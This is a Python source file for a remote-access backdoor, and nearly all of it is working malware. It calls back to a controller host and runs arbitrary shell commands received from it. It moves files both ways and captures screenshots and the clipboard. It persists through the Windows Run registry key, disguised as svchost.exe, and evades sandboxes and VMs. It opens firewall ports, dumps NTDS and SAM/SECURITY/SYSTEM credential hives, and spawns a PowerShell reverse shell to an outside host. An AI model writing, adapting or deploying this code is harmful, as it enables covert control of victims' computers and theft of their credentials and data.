#!/usr/bin/python
import base64
import ctypes
import hashlib
import json
import os
import platform
import shutil
import socket
import subprocess
import sys

import pyperclip
from Crypto import Random
from Crypto.Cipher import AES
from mss import mss

global ip, port, TMP, APPDATA, path, os_type, access_password, password

# connection/access settings ##############
dns = '0.0.0.0'
port = 6969
access_password = "1234"
###########################################

ip = socket.gethostbyname(dns)

# AES channel password ##############
password = "djknBDS89dHFS(*HFSD())"

# detect OS type ###############
if "Linux" in platform.uname():
    os_type = "linux"
else:
    os_type = "windows"

# set windows temp and appdata directory ######
if os_type == "windows":
    try:
        TMP = os.environ["TEMP"]
        APPDATA = os.environ["APPDATA"]
    except:
        os_type = 'linux'
        pass


# AES encryption/decryption class #################################################
class AESCipher(object):
    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]


# main backdoor class and functions #################################################################
class Backdoor:
    def __init__(self, ip, port):
        # uncomment to activated at startup if needed
        # self.persistance()
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while True:
            try:
                self.conn.connect((ip, port))
                break
            except socket.error:
                continue
        while True:
            pwd = self.receive()
            if pwd != access_password:
                self.json_send("\n [-] wrong password [-] \n")
                continue
            else:
                self.json_send("\n [+] access granted [+] \n")
                break

# encrypt/decrypt data ###############################################################
    def encrypt(self, message):
        encrypted = AESCipher(password).encrypt(message)
        return encrypted

    def decrypt(self, message):
        decrypted = AESCipher(password).decrypt(message)
        return decrypted

    # send/receive data ########################################################
    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.conn.send(self.encrypt(json_data))
        except:
            return self.conn.send(self.encrypt("\n [-] STDOUT parsing problem [-] \n"))
            pass

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(self.decrypt(json_data))
            except ValueError:
                continue
            except:
                pass

    # dump clipboard #####################
    def clipboard(self):
        try:
            s = pyperclip.paste()
            pyperclip.copy(s)
            return s
        except:
            return "\n [-] dump failed [-] \n"

    # take screenshot ###################
    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
        except:
            pass

    # persistence functions #######################################################################################################
    def persist_reg(self):
        if os_type == 'windows':
            try:
                location = os.environ["appdata"] + '\\svchost.exe'
                if not os.path.exists(location):
                    shutil.copyfile(sys.executable, location)
                    subprocess.call(
                        'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"',
                        shell=True)
                    return "\n[+] persistance access activated [+]\n"
            except:
                return "\n[!] failed to set persistance access [!]\n"
        else:
            return "\n[!] target is not a windows machine [!]\n"

    # system information ##########################
    def sysinfo(self):
        try:
            sysinfo = platform.uname()
            sysinfo = [' '.join(sysinfo)]
            return str(sysinfo)
        except:
            return "\n[!] unable to get sysinfo [!]\n"

    # read/write file ##################################
    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "upload completed"
        except:
            return "[-] failed to write file [-]"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "[-] no such file or directory [-]"

    def detectSandboxie(self):
        try:
            self.libHandle = ctypes.windll.LoadLibrary("SbieDll.dll")
            return "\n[!] Sandbox detected [!]\n"
        except:
            return "\n[+] doesn't appear to be a sandbox [+]\n"

    def detectVM(self):
        if os_type == "windows":
            try:
                import wmi
                self.objWMI = wmi.WMI()
                for objDiskDrive in self.objWMI.query("Select * from Win32_DiskDrive"):
                    if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
                        return "\n[!] Virtual Machine detected [!]\n"
                    return "\n[+] doesn't appear to be a VM [+]\n"
            except:
                return "\n[-] VM check failed, unable to load module wmi  [-]\n"
        else:
            try:
                self.checkVM = subprocess.check_output(
                    'grep -q ^flags.*\ hypervisor /proc/cpuinfo && echo "This machine is a VM"', shell=True)
                if self.checkVM == "This machine is a VM":
                    return "\n[!] Virtual Machine detected [!]\n"
            except subprocess.CalledProcessError:
                return "\n[+] doesn't appear to be a VM [+]\n"
            except Exception, e:
                return "\n[-] VM check failed, unable to grep /proc/cpuinfo " + str(e) + "\n"

    # set firewall rules ###############################################################################
    def firewall(self, direction, port, name):
        if os_type == "windows":
            rule = 'netsh advfirewall firewall add rule name=' + str(name) + ' protocol=TCP dir=' + str(
                direction) + ' localport= ' + str(port) + ' action=allow'
        else:
            if direction == "in":
                direction = "INPUT"
            if direction == "out":
                direction = "OUTPUT"
            rule = 'iptables -A ' + str(direction) + ' -p tcp --dport ' + str(port) + ' -j ACCEPT'
        try:
            subprocess.call(rule, shell=True)
            return "\n[+] firewall rule added successfully [+]\n"
        except:
            return "\n[-] failed to add firewall rule [-]\n"
            pass

    # spawn powershell session ####################################################################################
    def spawn(self, target_ip, target_port):
        if os_type == 'windows':
            target_ip = socket.gethostbyname(target_ip)
            spawner="""powershell -ep bypass -c "$client = New-Object System.Net.Sockets.TCPClient('""" + str(target_ip) + """',""" + str(target_port) + """);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""""
            try:
                subprocess.Popen(spawner, shell=True)
                return "\n[+] powershell session spawned successfully, check your listener [+]\n"
            except:
                return "\n[-] failed to spawn powershell session [-]\n"
        else:
            return "\n[!] target is not a windows machine [!]\n"

    # dump windows credentials ######################################################################################
    def ntds(self):
        if os_type == 'windows':
            is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
            if is_admin == '1':
                try:
                    shutil.rmtree("C:\Windows\Temp\copy-ntds")
                except:
                    pass
                try:
                    DEVNULL = open(os.devnull, 'wb')
                    result = str(subprocess.check_output(
                        'ntdsutil "ac i ntds" "ifm" "create full c:\windows\\temp\copy-ntds" quit quit', shell=True,
                        stderr=DEVNULL, stdin=DEVNULL))
                    return "\n[+] dumped using ntdsutil, saved in c:\Windows\Temp\copy-ntds [+]\n"
                except:
                    return "\n[-] ntds dump failed [-]\n"
            else:
                return "\n[+] permission denied, your not running as admin [+]\n"
        else:
            return "\n[!] target is not a windows machine [!]\n"

    def reg_save(self):
        if os_type == 'windows':
            is_admin = str(ctypes.windll.shell32.IsUserAnAdmin())
            if is_admin == '1':
                try:
                    os.remove('C:\Windows\Temp\sam.save')
                except:
                    pass
                try:
                    os.remove('C:\Windows\Temp\security.save')
                except:
                    pass
                try:
                    os.remove('C:\Windows\Temp\system.save')
                except:
                    pass
                try:
                    subprocess.call('reg save hklm\sam C:\Windows\Temp\sam.save', shell=True)
                    subprocess.call('reg save hklm\security C:\Windows\Temp\security.save', shell=True)
                    subprocess.call('reg save hklm\system C:\Windows\Temp\system.save', shell=True)
                    return "[+] dumped using reg save, saved in C:\Windows\Temp\sam.save, system.save , security.save [+]"
                except:
                    return "\n[-] reg-save dump failed [-]\n"
            else:
                return "\n[+] permission denied, your not running as admin [+]\n"
        else:
            return "\n[+] target is not a windows machine  [+]\n"

    # change working directory ########################
    def chdir(self, path):
        try:
            os.chdir(path)
            return "\ndir changed to " + os.getcwd() + "\n"
        except Exception, e:
            return "\n[-] no such file or directory [-]\n"

    # run commands #############################################################################################
    def run(self):
        while True:
            result = ""
            cmd = self.receive()
            if cmd[0] == "q":
                sys.exit(0)
            elif cmd[0] == "download":
                result = self.read_file(cmd[1])
            elif cmd[0] == "upload":
                result = self.write_file(cmd[1], cmd[2])
            elif cmd[0] == "shot":
                self.screenshot()
                result = self.read_file('monitor-1.png')
                os.remove('monitor-1.png')
            elif cmd[0] == "sysinfo":
                result = self.sysinfo()
            elif cmd[0] == "checkvm":
                result = str(self.detectSandboxie()) + "\n" + str(self.detectVM())
            elif cmd[0] == "persist_reg":
                result = self.persist_reg()
            elif cmd[0] == "clip":
                result = self.clipboard()
            elif cmd[0] == 'fw' and len(cmd) == 4:
                result = self.firewall(cmd[1], cmd[2], cmd[3])
            elif cmd[0] == "dump_ntds":
                result = self.ntds()
            elif cmd[0] == "dump_regsave":
                result = self.reg_save()
            elif cmd[0] == "cd" and len(cmd) > 1:
                directory = ' '.join(cmd[1:])

                result = self.chdir(directory)
            elif cmd[0] == "spawn":
                result = self.spawn(cmd[1], cmd[2])
            elif cmd[0] == "enum":
                if os_type == "linux":
                    self.linux_enum()
                    result = self.read_file('/tmp/enum.txt')
                else:
                    self.windows_enum()
                    result = self.read_file('C:\Windows\Temp\enum.txt')

            elif len(cmd) > 0:
                try:
                    cmd = ' '.join(cmd[0:])
                    if os_type == "linux":
                        result = str(subprocess.check_output(cmd + "; exit 0", shell=True, stderr=subprocess.STDOUT))
                    else:
                        DEVNULL = open(os.devnull, 'wb')
                        result = str(subprocess.check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL))
                except:
                    result = " "
            self.json_send(result)
            try:
                os.remove('/tmp/enum.txt')
            except:
                pass
            try:
                os.remove('C:\Windows\Temp\enum.txt')
            except:
                pass


if __name__ == '__main__':
    try:
        starter = Backdoor(ip, port)
        starter.run()
    except KeyboardInterrupt:
        sys.exit(0)
